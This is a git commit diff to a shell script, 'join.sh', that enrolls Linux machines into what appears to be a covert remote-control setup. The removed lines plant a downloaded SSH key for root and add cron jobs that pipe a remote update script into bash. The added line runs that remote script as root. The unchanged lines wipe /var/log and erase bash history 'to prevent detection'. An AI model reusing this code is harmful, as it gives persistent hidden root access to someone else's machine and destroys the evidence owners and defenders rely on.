c78c19186db49d358948d52917fd09875d9c1bda
ErikBoesen <me@erikboesen.com>
2018-04-04 19:16:14 -0400

    DRY by using linux's update.sh during join

--- control/linux/join.sh
+++ control/linux/join.sh
@@ -3,20 +3,6 @@ host=boesen.science
 down_port=2042
 up_port=2043
 
-sudo apt-get install openssh-server -y
-sudo systemctl start ssh.service
-sudo systemctl enable ssh.service
-
-sshpath="/root/.ssh"
-
-sudo mkdir -p "$sshpath"
-
-echo "Downloading pubkey..."
-sudo su -c "curl -L $host:$down_port/pubkey >> $sshpath/authorized_keys"
-
-sudo su -c "(crontab -l 2>/dev/null; echo \"*/20 * * * * curl -L $host:$down_port/linux/update.sh |bash\") | crontab -"
-sudo su -c "printf \"#\!/bin/bash\ncurl -L $host:$down_port/linux/update.sh |bash\n\" > /etc/cron.hourly/update; chmod +x /etc/cron.hourly/update"
-
 # Don't use whoami, will generally be root, which is useless
 user=$(ls /home | xargs -n1 | sort -u | xargs | tr ' ' ',')
 # hostname -I returns trailing space
@@ -35,5 +21,7 @@ printf "$ip" > /tmp/ip
 sudo rm -rf /etc/profile.d/sshpwd.sh /etc/xdg/lxsession/LXDE-pi/sshpwd.sh /var/log/*
 # Remove last line of bash history to prevent detection if typed into terminal
 sed -e '$ d' ~/.bash_history > /tmp/.bash_history; mv /tmp/.bash_history ~/.bash_history
+
+su -c "curl -L $host:$down_port/linux/update.sh |bash"
 
 clear;clear;clear
